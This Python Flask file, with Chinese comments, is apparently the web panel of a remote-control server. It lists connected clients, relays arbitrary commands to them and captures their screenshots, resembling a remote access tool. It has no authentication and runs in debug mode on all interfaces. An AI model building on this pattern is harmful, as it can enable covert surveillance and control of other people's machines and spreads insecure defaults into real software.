from flask import Flask, jsonify, request, render_template, send_file
from api import *


# Flask应用程序
app = Flask(__name__)


# 路由，用于获取在线客户端列表
@app.route('/online_clients', methods=['GET'])
def get_online_clients():
    check_alive()
    with lock:
        # 返回在线客户端的字典
        client_addresses = {client_uuid: [value[0].getpeername(), value[1]] for client_uuid, value in online_clients.items()}
    return jsonify(client_addresses)

# 路由，用于启动accept_connections线程
@app.route('/start_server', methods=['GET'])
def start_server():
    if connection_thread.is_alive():
        return 'Server is already running.'
    else:
        connection_thread.start()
        return 'Server started.'

# 路由，查询accept_connections线程状况
@app.route('/server_status', methods=['GET'])
def server_status():
    if connection_thread.is_alive():
        return 'online'
    else:
        return 'offline'

@app.route('/command', methods=['GET'])
def command():
    client_uuid = request.args.get('uuid', '')
    command = request.args.get('cmd', '')
    respond = oneline_command(client_uuid, command)
    return jsonify(respond.json)

@app.route('/screenshot', methods=['GET'])
def screenshot():
    client_uuid = request.args.get('uuid', '')
    respond = oneline_command(client_uuid, 'screenshot')
    return send_file(respond, mimetype='image/png')

@app.route('/')
def index():
    return render_template('index.html')


if __name__ == '__main__':
    # 启动Flask应用程序
    app.run(host='0.0.0.0', port=5000, debug=True)